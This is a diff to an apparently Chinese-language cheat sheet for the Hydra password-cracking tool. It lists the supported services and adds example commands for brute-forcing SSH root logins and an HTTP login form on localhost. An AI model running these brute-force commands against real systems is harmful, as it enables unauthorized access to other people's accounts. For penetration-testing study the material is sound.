@@ -64,9 +64,15 @@ server      目标ip
 service     指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等
 ```
 
-* use
+### use
 
-http post form attack
+* ssh
+
+```
+hydra ip -l root -P pass.lst
+```
+
+* http post form attack
 
 ```
 hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “/login.php:name=^USER^&pwd=^PASS^:incorrect:H=Cookie: security=low; PHPSESSID=o7qiqd9fc1d003u9d38k64t0f4”
